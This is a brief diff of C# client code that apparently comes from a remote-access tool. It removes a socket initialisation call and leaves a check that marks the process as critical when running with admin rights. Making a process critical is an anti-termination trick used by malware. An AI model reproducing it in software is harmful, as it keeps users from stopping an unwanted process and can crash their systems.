@@ -35,8 +35,6 @@ namespace Client
             if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                 ProcessCritical.Set();
 
-            ClientSocket.InitializeClient();
-
             while (true)
             {
                 if (!ClientSocket.IsConnected)
